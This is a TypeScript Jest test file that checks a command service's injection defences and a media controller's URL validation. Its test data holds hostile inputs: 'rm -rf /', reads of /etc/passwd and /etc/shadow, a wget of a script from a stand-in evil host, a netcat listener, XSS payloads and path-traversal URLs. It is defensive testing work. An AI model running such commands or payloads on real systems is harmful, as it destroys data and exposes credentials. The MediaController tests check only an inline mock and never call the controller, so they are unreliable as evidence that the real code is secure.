import { commandService } from '../services/commandService';
import { MediaController } from '../controllers/mediaController';

describe('安全修复测试', () => {
  describe('CommandService 命令注入防护', () => {
    it('应该拒绝包含危险字符的命令', () => {
      const dangerousCommands = [
        'ls; rm -rf /',
        'pwd && cat /etc/passwd',
        'whoami | wc -l',
        'date `whoami`',
        'uptime $(cat /etc/passwd)',
        'free; echo "malicious"',
        'df & echo "attack"',
        'ps | grep root',
        'top `id`',
        'systemctl; rm -rf /',
        'service; cat /etc/shadow',
        'docker; echo "hack"',
        'git; rm -rf .',
        'npm; echo "evil"',
        'node; process.exit(1)'
      ];

      dangerousCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(
          result.message?.includes('命令包含危险字符') ||
          result.message?.includes('不允许执行命令') ||
          result.message?.includes('参数包含危险字符')
        ).toBe(true);
      });
    });

    it('应该拒绝包含危险字符的参数', () => {
      const dangerousArgs = [
        'ls --help; rm -rf /',
        'pwd --version && cat /etc/passwd',
        'whoami --help | wc -l',
        'date --help `whoami`',
        'uptime --help $(cat /etc/passwd)',
        'free --help; echo "malicious"',
        'df --help & echo "attack"',
        'ps --help | grep root',
        'top --help `id`',
        'systemctl --help; rm -rf /',
        'service --help; cat /etc/shadow',
        'docker --help; echo "hack"',
        'git --help; rm -rf .',
        'npm --help; echo "evil"',
        'node --help; process.exit(1)'
      ];

      dangerousArgs.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('命令包含危险字符');
      });
    });

    it('应该拒绝不在白名单中的命令', () => {
      const unauthorizedCommands = [
        'rm -rf /',
        'cat /etc/passwd',
        'wget http://evil.com/script.sh',
        'curl http://malicious.com',
        'nc -l 4444',
        'bash -c "echo evil"',
        'sh -c "rm -rf /"',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'perl -e "system(\'rm -rf /\')"',
        'ruby -e "system(\'rm -rf /\')"'
      ];

      unauthorizedCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        const msg = result.message || '';
        console.log(command, msg);
        expect(result.status).toBe('error');
        expect(
          msg.includes('不允许执行命令') ||
          msg.includes('参数包含危险字符') ||
          msg.includes('命令包含危险字符')
        ).toBe(true);
      });
    });

    it('应该接受安全的命令', () => {
      const safeCommands = [
        'pwd',
        'whoami',
        'date',
        'uptime'
      ];

      safeCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('command added');
        expect(result.command).toBe(command);
      });
    });

    it('应该拒绝过长的命令', () => {
      const longCommand = 'ls ' + 'a'.repeat(200);
      const result = commandService.addCommand(longCommand, 'wumy');
      expect(result.status).toBe('error');
      expect(result.message).toContain('命令长度超过限制');
    });
  });

  describe('MediaController 安全防护', () => {
    it('应该拒绝包含危险字符的URL', () => {
      const dangerousUrls = [
        'http://example.com<script>alert("xss")</script>',
        'https://malicious.com<img src=x onerror=alert("xss")>',
        'ftp://evil.com<iframe src="javascript:alert(\'xss\')"></iframe>',
        'http://attack.com<svg onload="alert(\'xss\')"></svg>',
        'https://hack.com<object data="javascript:alert(\'xss\')"></object>'
      ];

      dangerousUrls.forEach(url => {
        // 这里需要根据实际的 MediaController 实现来调整测试
        expect(() => {
          // 模拟 URL 验证
          if (url.includes('<') || url.includes('>') || url.includes('javascript:')) {
            throw new Error('URL包含危险字符');
          }
        }).toThrow('URL包含危险字符');
      });
    });

    it('应该拒绝路径遍历攻击', () => {
      const pathTraversalUrls = [
        'http://example.com/../../../etc/passwd',
        'https://malicious.com/../../../../root',
        'ftp://evil.com/etc/../etc/shadow',
        'http://attack.com/tmp/../etc/passwd',
        'https://hack.com/var/../etc/shadow'
      ];

      pathTraversalUrls.forEach(url => {
        expect(() => {
          // 模拟路径遍历检测
          if (url.includes('../') || url.includes('..\\')) {
            throw new Error('检测到路径遍历攻击');
          }
        }).toThrow('检测到路径遍历攻击');
      });
    });
  });
}); 